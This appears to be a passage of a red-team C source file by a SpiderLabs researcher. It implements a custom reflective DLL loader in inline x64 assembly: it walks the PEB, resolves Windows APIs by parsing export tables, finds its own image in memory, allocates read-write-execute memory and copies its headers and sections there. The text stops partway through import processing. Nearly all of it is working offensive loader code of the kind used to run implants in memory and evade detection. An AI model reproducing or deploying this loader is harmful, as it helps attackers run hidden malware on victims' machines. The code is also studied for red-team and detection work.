// Author: Bobby Cooke (@0xBoku) // SpiderLabs // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
// Credits: Stephen Fewer (@stephenfewer) & SEKTOR7 Crew (@SEKTOR7net) https://institute.sektor7.net/
#include <windows.h>

typedef BOOL    (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );
typedef HMODULE (WINAPI * tLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI * tGetProcAddress) (HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI * tVirtualAlloc) (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef DWORD   (NTAPI * tNtFlushInstructionCache)( HANDLE ProcessHandle, PVOID BaseAddress, ULONG NumberOfBytesToFlush );

__declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
{
	PVOID initRdllAddr;
	PVOID newRdllAddr;
	PVOID uiAddressArray;
	PVOID uiNameArray;
	PVOID importedDllExportDirectory;
	PVOID uiNameOrdinals;
	DWORD dwHashValue;
	PVOID newExeHeaderAddr;
	PVOID ntdllAddr;
	PVOID ntdllExportDirectory;
	PVOID ntdllExAddrTable;
	PVOID ntdllExNamePointerTable;
	PVOID ntdllExOrdinalTable;

	char ntFlushStr[] = "NtFlushInstructionCache";
	PVOID ntFlushStrLen = (PVOID)sizeof(ntFlushStr);
	tNtFlushInstructionCache pNtFlushInstructionCache = NULL;
	
	//char ntAllocVmStr[] = "NtAllocateVirtualMemory";
	//PVOID ntAllocVmStrLen = (PVOID)sizeof(ntAllocVmStr);
	//NTALLOCATEVIRTUALMEMORY pNtAllocateVirtualMemory = NULL;

	PVOID kernel32Addr;
	PVOID kernel32ExportDirectory;
	PVOID kernel32ExAddrTable;
	PVOID kernel32ExNamePointerTable;
	PVOID kernel32ExOrdinalTable;

	char getProcAddrStr[] = "GetProcAddress";
	PVOID getProcAddrStrLen = (PVOID)sizeof(getProcAddrStr);
	tGetProcAddress pGetProcAddress = NULL;

	char loadLibraryAStr[] = "LoadLibraryA";
	PVOID loadLibraryAStrLen = (PVOID)sizeof(loadLibraryAStr);
	tLoadLibraryA pLoadLibraryA = NULL;
	
	char VirtualAllocStr[] = "VirtualAlloc";
	PVOID VirtualAllocStrLen = (PVOID)sizeof(VirtualAllocStr);
	tVirtualAlloc pVirtualAlloc = NULL;

	// STEP 0: calculate our images current base address
	// get &ntdll.dll
	__asm__(
	//	"int3 \n"
		"xor rdi, rdi \n"            // RDI = 0x0
		"mul rdi \n"                 // RAX&RDX =0x0
		"mov rbx, gs:[rax+0x60] \n"   // RBX = Address_of_PEB
		"mov rbx, [rbx+0x18] \n"      // RBX = Address_of_LDR
		"mov rbx, [rbx+0x20] \n"
		"mov rbx, [rbx] \n"          // RBX = 1st entry in InitOrderModuleList / ntdll.dll
		"mov rbx, [rbx+0x20] \n"      // RBX = &ntdll.dll ( Base Address of ntdll.dll)
		"mov %[ntdllAddr], rbx \n"
		:[ntdllAddr] "=r" (ntdllAddr)
	);
	// find the Export Directory for NTDLL
	__asm__(
		"mov rcx, %[ntdllAddr] \n"
	   	"mov rbx, rcx \n"
       		"mov r8, rcx \n"
       		"mov ebx, [rbx+0x3C] \n"
       		"add rbx, r8 \n"
       		"xor rcx, rcx \n"
       		"add cx, 0x88 \n"
       		"mov edx, [rbx+rcx] \n"
       		"add rdx, r8 \n"
 	   	"mov %[ntdllExportDirectory], rdx \n"
	   	:[ntdllExportDirectory] "=r" (ntdllExportDirectory)
	   	:[ntdllAddr] "r" (ntdllAddr)
	);

	// RCX = &NTDLL.ExportDirectory | RDX = &NTDLL.DLL
	__asm__(
		"mov rcx, %[ntdllExportDirectory] \n"
		"mov rdx, %[ntdllAddr] \n"
		"xor rax, rax \n"
		"add rcx, 0x1C \n"
		"mov eax, [rcx] \n"
		"add rax, rdx \n"
		"mov %[ntdllExAddrTable], rax \n"
		:[ntdllExAddrTable] "=r" (ntdllExAddrTable)
		:[ntdllExportDirectory] "r" (ntdllExportDirectory),
		 [ntdllAddr] "r" (ntdllAddr)
	);
	__asm__(
		"mov rcx, %[ntdllExportDirectory] \n"
		"mov rdx, %[ntdllAddr] \n"
		"xor rax, rax \n"
		"add rcx, 0x20 \n"
		"mov eax, dword ptr [rcx] \n"
		"add rax, rdx \n"
		"mov %[ntdllExNamePointerTable], rax \n"
		:[ntdllExNamePointerTable] "=r" (ntdllExNamePointerTable)
		:[ntdllExportDirectory] "r" (ntdllExportDirectory),
		 [ntdllAddr] "r" (ntdllAddr)
	);
	__asm__(
		"mov rcx, %[ntdllExportDirectory] \n"
		"mov rdx, %[ntdllAddr] \n"
		"xor rax, rax \n"
		"add rcx, 0x24 \n"
		"mov eax, dword ptr [rcx] \n"
		"add rax, rdx \n"
		"mov %[ntdllExOrdinalTable], rax \n"
		:[ntdllExOrdinalTable] "=r" (ntdllExOrdinalTable)
		:[ntdllExportDirectory] "r" (ntdllExportDirectory),
		 [ntdllAddr] "r" (ntdllAddr)
	);
	// NTDLL.NtFlushInstructionCache
	// On Load:
	// RAX = DWORD apiNameStringLen
	// RDX = LPSTR apiNameString
	// RCX  = PVOID moduleAddr
	// R8  = PVOID ExExAddressTable
	// R9 = PVOID ExNamePointerTable
	// R10 = PVOID ExOrdinalTable
	// For loop:
	// RCX/[RSP] = DWORD apiNameStringLen
	// RDX = LPSTR apiNameString
	// R11 = PVOID moduleAddr
	// R8  = PVOID ExExAddressTable
	// R9  = PVOID ExNamePointerTable
	// R10 = PVOID ExOrdinalTable
	__asm__(
		"mov r11, %[ntdllAddr] \n"
		"mov rcx, %[ntFlushStrLen] \n"
		"mov rdx, %[ntFlushStr] \n"
		"mov r8, %[ntdllExAddrTable] \n"
		"mov r9, %[ntdllExNamePointerTable] \n"
		"mov r10, %[ntdllExOrdinalTable] \n"
		"push rcx \n"
		"xor rax, rax \n"
		"jmp short getApiAddrLoop \n"
	"getApiAddrLoop: \n"
		"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD apiNameStringLen (Reset string length counter for each loop)
		"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
		"mov edi, [r9+rax*4] \n"        // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
		"add rdi, r11 \n"               // RDI = &NameString    = RVA NameString + &module.dll
		"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
		"repe cmpsb \n"                 // Compare strings at RDI & RSI
		"je getApiAddrFin \n"           // If match then we found the API string. Now we need to find the Address of the API
		"inc rax \n"                    // Increment to check if the next name matches
		"jmp short getApiAddrLoop \n"   // Jump back to start of loop
	"getApiAddrFin: \n"
		"pop rcx \n"                    // Remove string length counter from top of stack
		"mov ax, [r10+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
		"mov eax, [r8+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
		"add rax, r11 \n"               // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
		"mov %[pNtFlushInstructionCache], rax \n"  // Save &ntdll.NtFlushInstructionCache to the variable pNtFlushInstructionCache
		:[pNtFlushInstructionCache] "=r" (pNtFlushInstructionCache)
		:[ntFlushStrLen]"r"(ntFlushStrLen),
		 [ntFlushStr]"r"(ntFlushStr),
		 [ntdllAddr]"r"(ntdllAddr),
		 [ntdllExAddrTable]"r"(ntdllExAddrTable),
		 [ntdllExNamePointerTable]"r"(ntdllExNamePointerTable),
		 [ntdllExOrdinalTable]"r"(ntdllExOrdinalTable)
	);

	// KERNEL32.DLL
	// get &kernel32.dll
	__asm__(
		"xor rdi, rdi \n"              // RDI = 0x0
	 	"mul rdi \n"                   // RAX&RDX =0x0
		"mov rbx, gs:[rax+0x60] \n"    // RBX = Address_of_PEB
		"mov rbx, [rbx+0x18] \n"       // RBX = Address_of_LDR
		"mov rbx, [rbx+0x20] \n"       // RBX = 1st entry in InitOrderModuleList / ntdll.dll
		"mov rbx, [rbx] \n"            // RBX = 2nd entry in InitOrderModuleList / kernelbase.dll
		"mov rbx, [rbx] \n"            // RBX = 3rd entry in InitOrderModuleList / kernel32.dll
		"mov rbx, [rbx+0x20] \n"       // RBX = &kernel32.dll ( Base Address of kernel32.dll)
		"mov %[kernel32Addr], rbx \n"
		:[kernel32Addr] "=r" (kernel32Addr)
	);

	// get &kernel32.ExportDirectory
	__asm__(
		"mov rcx, %[kernel32Addr] \n"
		"mov rbx, rcx \n"
       		"mov r8, rcx \n"
       		"mov ebx, [rbx+0x3C] \n"
       		"add rbx, r8 \n"
      		"xor rcx, rcx \n"
     		"add cx, 0x88ff \n"
     		"shr rcx, 0x8 \n"
   		"mov edx, [rbx+rcx] \n"
  	     	"add rdx, r8 \n"
 	   	"mov %[kernel32ExportDirectory], rdx \n"
	   	:[kernel32ExportDirectory] "=r" (kernel32ExportDirectory)
	   	:[kernel32Addr] "r" (kernel32Addr)
	);

	// get Kernel32 Export Address Table
	// RCX = &NTDLL.ExportDirectory | RDX = &NTDLL.DLL
	__asm__(
		"mov rcx, %[kernel32ExportDirectory] \n"
		"mov rdx, %[kernel32Addr] \n"
		"xor rax, rax \n"
		"add rcx, 0x1C \n"
		"mov eax, [rcx] \n"
		"add rax, rdx \n"
		"mov %[kernel32ExAddrTable], rax \n"
		:[kernel32ExAddrTable] "=r" (kernel32ExAddrTable)
		:[kernel32ExportDirectory] "r" (kernel32ExportDirectory),
		 [kernel32Addr] "r" (kernel32Addr)
	);

	__asm__(
		"mov rcx, %[kernel32ExportDirectory] \n"
		"mov rdx, %[kernel32Addr] \n"
		"xor rax, rax \n"
		"add rcx, 0x20 \n"
		"mov eax, dword ptr [rcx] \n"
		"add rax, rdx \n"
		"mov %[kernel32ExNamePointerTable], rax \n"
		:[kernel32ExNamePointerTable] "=r" (kernel32ExNamePointerTable)
		:[kernel32ExportDirectory] "r" (kernel32ExportDirectory),
		 [kernel32Addr] "r" (kernel32Addr)
	);

	// get kernel32 Export Ordinal Table
	__asm__(
		"mov rcx, %[kernel32ExportDirectory] \n"
		"mov rdx, %[kernel32Addr] \n"
		"xor rax, rax \n"
		"add rcx, 0x24 \n"
		"mov eax, dword ptr [rcx] \n"
		"add rax, rdx \n"
		"mov %[kernel32ExOrdinalTable], rax \n"
		:[kernel32ExOrdinalTable] "=r" (kernel32ExOrdinalTable)
		:[kernel32ExportDirectory] "r" (kernel32ExportDirectory),
		 [kernel32Addr] "r" (kernel32Addr)
	);

	// GetProcAddress
	__asm__(
		"mov r11, %[kernel32Addr] \n"
		"mov rcx, %[getProcAddrStrLen] \n"
		"mov rdx, %[getProcAddrStr] \n"
		"mov r8, %[kernel32ExAddrTable] \n"
		"mov r9, %[kernel32ExNamePointerTable] \n"
		"mov r10, %[kernel32ExOrdinalTable] \n"
		"push rcx \n"
		"xor rax, rax \n"
		"jmp short getk1ApiAddrLoop \n"
	"getk1ApiAddrLoop: \n"
		"mov rcx, [rsp] \n"               // RCX/[RSP] = DWORD apiNameStringLen (Reset string length counter for each loop)
		"xor rdi, rdi \n"                 // Clear RDI for setting up string name retrieval
		"mov edi, [r9+rax*4] \n"          // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
		"add rdi, r11 \n"                 // RDI = &NameString    = RVA NameString + &module.dll
		"mov rsi, rdx \n"                 // RSI = Address of API Name String to match on the Stack (reset to start of string)
		"repe cmpsb \n"                   // Compare strings at RDI & RSI
		"je getk1ApiAddrFin \n"           // If match then we found the API string. Now we need to find the Address of the API
		"inc rax \n"                      // Increment to check if the next name matches
		"jmp short getk1ApiAddrLoop \n"   // Jump back to start of loop
	"getk1ApiAddrFin: \n"
		"pop rcx \n"                      // Remove string length counter from top of stack
		"mov ax, [r10+rax*2] \n"          // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
		"mov eax, [r8+rax*4] \n"          // RAX = RVA API = [&AddressTable + API OrdinalNumber]
		"add rax, r11 \n"                 // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
		"mov %[pGetProcAddress], rax \n"  // Save &kernel32.GetProcAddress to the variable pGetProcAddress
		:[pGetProcAddress] "=r" (pGetProcAddress)
		:[getProcAddrStrLen]"r"(getProcAddrStrLen),
		 [getProcAddrStr]"r"(getProcAddrStr),
		 [kernel32Addr]"r"(kernel32Addr),
		 [kernel32ExAddrTable]"r"(kernel32ExAddrTable),
		 [kernel32ExNamePointerTable]"r"(kernel32ExNamePointerTable),
		 [kernel32ExOrdinalTable]"r"(kernel32ExOrdinalTable)
	); 
	
	// VirtualAlloc
	__asm__(
		"mov r11, %[kernel32Addr] \n"
		"mov rcx, %[VirtualAllocStrLen] \n"
		"mov rdx, %[VirtualAllocStr] \n"
		"mov r8, %[kernel32ExAddrTable] \n"
		"mov r9, %[kernel32ExNamePointerTable] \n"
		"mov r10, %[kernel32ExOrdinalTable] \n"
		"push rcx \n"
		"xor rax, rax \n"
		"jmp short getk2ApiAddrLoop \n"
	"getk2ApiAddrLoop: \n"
		"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD apiNameStringLen (Reset string length counter for each loop)
		"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
		"mov edi, [r9+rax*4] \n"        // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
		"add rdi, r11 \n"               // RDI = &NameString    = RVA NameString + &module.dll
		"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
		"repe cmpsb \n"                 // Compare strings at RDI & RSI
		"je getk2ApiAddrFin \n"         // If match then we found the API string. Now we need to find the Address of the API
		"inc rax \n"                    // Increment to check if the next name matches
		"jmp short getk2ApiAddrLoop \n" // Jump back to start of loop
	"getk2ApiAddrFin: \n"
		"pop rcx \n"                    // Remove string length counter from top of stack
		"mov ax, [r10+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
		"mov eax, [r8+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
		"add rax, r11 \n"               // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
		"mov %[pVirtualAlloc], rax \n"  // Save &kernel32.VirtualAlloc to the variable pVirtualAlloc
		:[pVirtualAlloc] "=r" (pVirtualAlloc)
		:[VirtualAllocStrLen]"r"(VirtualAllocStrLen),
		 [VirtualAllocStr]"r"(VirtualAllocStr),
		 [kernel32Addr]"r"(kernel32Addr),
		 [kernel32ExAddrTable]"r"(kernel32ExAddrTable),
		 [kernel32ExNamePointerTable]"r"(kernel32ExNamePointerTable),
		 [kernel32ExOrdinalTable]"r"(kernel32ExOrdinalTable)
	);

	//LoadLibraryA
	__asm__(
		"mov r11, %[kernel32Addr] \n"
		"mov rcx, %[loadLibraryAStrLen] \n"
		"mov rdx, %[loadLibraryAStr] \n"
		"mov r8, %[kernel32ExAddrTable] \n"
		"mov r9, %[kernel32ExNamePointerTable] \n"
		"mov r10, %[kernel32ExOrdinalTable] \n"
		"push rcx \n"
		"xor rax, rax \n"
		"jmp short getk3ApiAddrLoop \n"
	"getk3ApiAddrLoop: \n"
		"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD apiNameStringLen (Reset string length counter for each loop)
		"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
		"mov edi, [r9+rax*4] \n"        // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
		"add rdi, r11 \n"               // RDI = &NameString    = RVA NameString + &module.dll
		"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
		"repe cmpsb \n"                 // Compare strings at RDI & RSI
		"je getk3ApiAddrFin \n"         // If match then we found the API string. Now we need to find the Address of the API
		"inc rax \n"                    // Increment to check if the next name matches
		"jmp short getk3ApiAddrLoop \n" // Jump back to start of loop
	"getk3ApiAddrFin: \n"
		"pop rcx \n"                    // Remove string length counter from top of stack
		"mov ax, [r10+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
		"mov eax, [r8+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
		"add rax, r11 \n"               // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
		"mov %[pLoadLibraryA], rax \n"  // Save &kernel32.LoadLibraryA to the variable pLoadLibraryA
		:[pLoadLibraryA] "=r" (pLoadLibraryA)
		:[loadLibraryAStrLen]"r"(loadLibraryAStrLen),
		 [loadLibraryAStr]"r"(loadLibraryAStr),
		 [kernel32Addr]"r"(kernel32Addr),
		 [kernel32ExAddrTable]"r"(kernel32ExAddrTable),
		 [kernel32ExNamePointerTable]"r"(kernel32ExNamePointerTable),
		 [kernel32ExOrdinalTable]"r"(kernel32ExOrdinalTable)
	);

	// Find ourselves in memory by searching for "MZ" 
	__asm__(
		"call pop \n"       // Calling the next instruction puts RIP address on the top of our stack
		"pop: \n"
		"pop rax \n"        // pop dat RIP into RAX
		"xor rbx,rbx \n"    // Clear out RBX - were gonna use it for comparing if we are at start
		"mov ebx,0x5A4D \n" // "MZ" bytes for comparing if we are at the start of our reflective DLL
		"or ax,0xFFF \n"    // This with +1 will align us to a memory page.
		"inc ax \n"
	"decPage:"
		"sub eax,0x1000 \n"           // move down a full memory page
		"cmp bx,word ptr ds:[rax] \n" // Compare the first 2 bytes of the page to "MZ"
		"jne decPage \n"              // if we found "MZ" end, else check next page
		"mov %[initRdllAddr], rax \n"
		:[initRdllAddr] "=r" (initRdllAddr)
	);

	// STEP 2 | Get size of our RDLL image, allocate memory for our new RDLL, and copy/write the headers from init RDLL to new RDLL

	// get the VA of the NT Header for the PE to be loaded
	__asm__(
		"mov rax, %[initRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax+0x3C] \n"       // RBX = Offset NewEXEHeader
		"add rbx, rax \n"              // RBX = &reflectiveDll.dll + Offset NewEXEHeader = &NewEXEHeader
		"mov %[newExeHeaderAddr], rbx \n"  // newExeHeaderAddr = ((PIMAGE_DOS_HEADER)initRdllAddr)->e_lfanew
		:[newExeHeaderAddr] "=r" (newExeHeaderAddr)
		:[initRdllAddr] "r" (initRdllAddr)
	);
	// Get the size of our entire RDLL
	PVOID rdllSize;
	__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax+0x50] \n" // EBX = ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
		"mov %[rdllSize], rbx \n"
		:[rdllSize] "=r" (rdllSize)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)	
	);

	// Allocate new memory to write our new RDLL too
	newRdllAddr = (PVOID)pVirtualAlloc( NULL, (SIZE_T)rdllSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// Get SizeOfHeaders
	PVOID SizeOfHeaders;
	__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"xor rbx, rbx \n"
		"mov %[SizeOfHeaders], [rax+0x54] \n" // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
		:[SizeOfHeaders] "=r" (SizeOfHeaders)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)	
	);
	// Write Headers from init RDLL to new RDLL
	__asm__(
		"mov rax, %[SizeOfHeaders] \n"
		"mov rsi, %[initRdllAddr] \n"
		"mov rdi, %[newRdllAddr] \n"
	"writeLooper: \n"
		"dec eax \n"           // Decrement the counter
		"xor rbx, rbx \n"
		"mov bl, [rsi]  \n"    // Load the next byte to write into the BL register
		"mov [rdi], bl \n"     // write the byte to newRdllAddr
		"inc rsi \n"           // move RSI to next bye of initRdllAddr 
		"inc rdi \n"           // move RDI to next bye of newRdllAddr 
		"test rax, rax \n"     // check if rax = 0
		"jne writeLooper \n"   // if rax != 0, then write next byte via loop
		:  // No outputs
		:[SizeOfHeaders] "r" (SizeOfHeaders),
		 [initRdllAddr] "r" (initRdllAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);

	// STEP 3 | Copy/write the sections from init RDLL to new RDLL
// RdllNthSectionAddr = the VA of the first section
// RdllNthSectionAddr = ( (PVOID)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
	// Get the Optional Header Address
	// (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader
	PVOID OptionalHeaderAddr;
	__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"add rax, 0x18 \n"
		"mov %[OptionalHeaderAddr], rax \n"
		:[OptionalHeaderAddr] "=r" (OptionalHeaderAddr)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)
	);
	// Get the Size of the Optional Header from the File Header of our Reflective DLL
	//((PIMAGE_NT_HEADERS)newExeHeaderAddr)->FileHeader.SizeOfOptionalHeader;
	PVOID SizeOfOptionalHeader;
		__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"add rax, 0x14 \n"  // RAX = &FileHeader.SizeOfOptionalHeader
		"xor rbx, rbx \n"
		"mov bx, [rax] \n"  // RBX = Value of FileHeader.SizeOfOptionalHeader
		"mov %[SizeOfOptionalHeader], rbx \n"
		:[SizeOfOptionalHeader] "=r" (SizeOfOptionalHeader)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)
	);
	// &[OptionalHeaderAddr+SizeOfOptionalHeader] = Virtual Address of the first section
	// (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader + ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->FileHeader.SizeOfOptionalHeader )
	PVOID RdllNthSectionAddr;
		__asm__(
		"mov rax, %[OptionalHeaderAddr] \n"
		"mov rbx, %[SizeOfOptionalHeader] \n"
		"add rax, rbx \n"
		"mov %[RdllNthSectionAddr], rax \n"
		:[RdllNthSectionAddr] "=r" (RdllNthSectionAddr)
		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr),
		 [SizeOfOptionalHeader] "r" (SizeOfOptionalHeader)
	);
// END of finding RdllNthSectionAddr

	// itterate through all sections, loading them into memory.
	// ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->FileHeader.NumberOfSections;
	PVOID NumberOfSections;
	__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"add rax, 0x6 \n"  // RAX = &FileHeader.NumberOfSections
		"xor rbx, rbx \n"
		"mov bx, [rax] \n"
		"mov %[NumberOfSections], rbx \n"  // Value of FileHeader.NumberOfSections
		:[NumberOfSections] "=r" (NumberOfSections)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)
	);

	PVOID SectionRelativeVirtualAddress;
	PVOID newRdllSectionVirtualAddress;
	PVOID RVASectionPointerToRawData;
	PVOID InitRdllSectionVirtualAddress;
	PVOID SizeOfSection;

	while( NumberOfSections-- )
	{
		// STEP 3.1 | Get the source destination for the section
		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->VirtualAddress = DWORD [RdllNthSectionAddr+0xC]
		// .text = SectionRelativeVirtualAddress = 191000 | 190000 = &newRdllAddr | 1000 = VirtualAddress
		//SectionRelativeVirtualAddress = ( newRdllAddr + ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->VirtualAddress );
		// SectionRelativeVirtualAddress = (PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->VirtualAddress
		__asm__(
			"mov rax, %[RdllNthSectionAddr] \n"
			"add rax, 0xC \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax] \n"
			"mov %[SectionRelativeVirtualAddress], rbx \n"
			:[SectionRelativeVirtualAddress] "=r" (SectionRelativeVirtualAddress)
			:[RdllNthSectionAddr] "r" (RdllNthSectionAddr)
		);
		// newRdllSectionVirtualAddress = newRdllAddr + SectionRelativeVirtualAddress
		__asm__(
			"mov rax, %[newRdllAddr] \n"
			"mov rbx, %[SectionRelativeVirtualAddress] \n"
			"add rbx, rax \n"
			"mov %[newRdllSectionVirtualAddress], rbx \n"
			:[newRdllSectionVirtualAddress] "=r" (newRdllSectionVirtualAddress)
			:[newRdllAddr] "r" (newRdllAddr),
			[SectionRelativeVirtualAddress] "r" (SectionRelativeVirtualAddress)
		);	

		// STEP 3.2 | Get the destination memory address to write the section too
		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->PointerToRawData = DWORD [RdllNthSectionAddr+0x14]
		// .text = InitRdllSectionVirtualAddress = 140400 | 140000 = &newRdllAddr | 400 = PointerToRawData
		// InitRdllSectionVirtualAddress = ( initRdllAddr + ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->PointerToRawData );
		// (PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->PointerToRawData
		__asm__(
			"mov rax, %[RdllNthSectionAddr] \n"
			"add rax, 0x14 \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax] \n"
			"mov %[RVASectionPointerToRawData], rbx \n"
			:[RVASectionPointerToRawData] "=r" (RVASectionPointerToRawData)
			:[RdllNthSectionAddr] "r" (RdllNthSectionAddr)
		);
		// InitRdllSectionVirtualAddress = initRdllAddr + RVASectionPointerToRawData
		__asm__(
			"mov rax, %[initRdllAddr] \n"
			"mov rbx, %[RVASectionPointerToRawData] \n"
			"add rbx, rax \n"
			"mov %[InitRdllSectionVirtualAddress], rbx \n"
			:[InitRdllSectionVirtualAddress] "=r" (InitRdllSectionVirtualAddress)
			:[initRdllAddr] "r" (initRdllAddr),
			[RVASectionPointerToRawData] "r" (RVASectionPointerToRawData)
		);	
		// STEP 3.3 | Get the size of the section
		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->SizeOfRawData = DWORD [RdllNthSectionAddr+0x10]
		// SizeOfSection = ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->SizeOfRawData
		__asm__(
			"mov rax, %[RdllNthSectionAddr] \n"
			"add rax, 0x10 \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax] \n"
			"mov %[SizeOfSection], rbx \n"
			:[SizeOfSection] "=r" (SizeOfSection)
			:[RdllNthSectionAddr] "r" (RdllNthSectionAddr)
		);
		// STEP 3.4 | Copy the section from the source address to the destination for the size of the section
		//while( SizeOfSection-- )
		//	*(BYTE *)newRdllSectionVirtualAddress++ = *(BYTE *)InitRdllSectionVirtualAddress++;
		// Write/Copy the section to the newRdll Adress memory
		__asm__(
			"mov rax, %[SizeOfSection] \n"
			"mov rsi, %[InitRdllSectionVirtualAddress] \n"
			"mov rdi, %[newRdllSectionVirtualAddress] \n"
		"writeLooper2: \n"
			"dec eax \n"           // Decrement the counter
			"xor rbx, rbx \n"
			"mov bl, [rsi]  \n"    // Load the next byte to write into the BL register
			"mov [rdi], bl \n"     // write the byte to newRdllSectionVirtualAddress
			"inc rsi \n"           // move RSI to next bye of InitRdllSectionVirtualAddress 
			"inc rdi \n"           // move RDI to next bye of newRdllSectionVirtualAddress 
			"test rax, rax \n"     // check if rax = 0
			"jne writeLooper2 \n"   // if rax != 0, then write next byte via loop
			:  // No outputs
			:[SizeOfSection] "r" (SizeOfSection),
			[InitRdllSectionVirtualAddress] "r" (InitRdllSectionVirtualAddress),
			[newRdllSectionVirtualAddress] "r" (newRdllSectionVirtualAddress)
		);
		// STEP 3.5 | Get the address of the next section header and loop until there are no more sections
		//RdllNthSectionAddr += sizeof( IMAGE_SECTION_HEADER );
		__asm__(
			"mov rax, %[InRdllNthSectionAddr] \n"
			"add rax, 0x28 \n" // sizeof( IMAGE_SECTION_HEADER ) = 0x28
			"mov %[OutRdllNthSectionAddr], rax \n"
			:[OutRdllNthSectionAddr] "=r" (RdllNthSectionAddr)
			:[InRdllNthSectionAddr] "r" (RdllNthSectionAddr)
		);
	}

// STEP 4: process our images import table

	// STEP 4.1 | Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
	// rdllDataDirImportDirectoryAddr = (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
	PVOID rdllDataDirImportDirectoryAddr;
	__asm__(
		"mov rax, %[OptionalHeaderAddr] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x78 \n"
		"add rax, rbx \n"
		"mov %[rdllDataDirImportDirectoryAddr], rax \n"
		:[rdllDataDirImportDirectoryAddr] "=r" (rdllDataDirImportDirectoryAddr)
		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr)
	);
	// STEP 4.2 | Get the Address of the Import Directory from the Data Directory
//     typedef struct _IMAGE_DATA_DIRECTORY {
//       DWORD VirtualAddress;
//       DWORD Size;
//     } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;
	//  rdllImportDirectoryAddr = newRdllAddr + ((PIMAGE_DATA_DIRECTORY)rdllDataDirImportDirectoryAddr)->VirtualAddress 
	PVOID rdllImportDirectoryAddr;
	__asm__(
		"mov rax, %[rdllDataDirImportDirectoryAddr] \n"
		"mov rdx, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax] \n"  // EBX = RVA of Import Directory
		"add rdx, rbx \n" // Import Directory of New RDLL = RVA of Import Directory + New RDLL Base Address
		"mov %[rdllImportDirectoryAddr], rdx \n"
		:[rdllImportDirectoryAddr] "=r" (rdllImportDirectoryAddr)
		:[rdllDataDirImportDirectoryAddr] "r" (rdllDataDirImportDirectoryAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);
//    typedef struct _IMAGE_IMPORT_DESCRIPTOR {
//       __C89_NAMELESS union {
//     		DWORD Characteristics;
//     		DWORD OriginalFirstThunk;
//       } DUMMYUNIONNAME;
//       DWORD TimeDateStamp;
//       DWORD ForwarderChain;
//       DWORD Name;
//       DWORD FirstThunk;
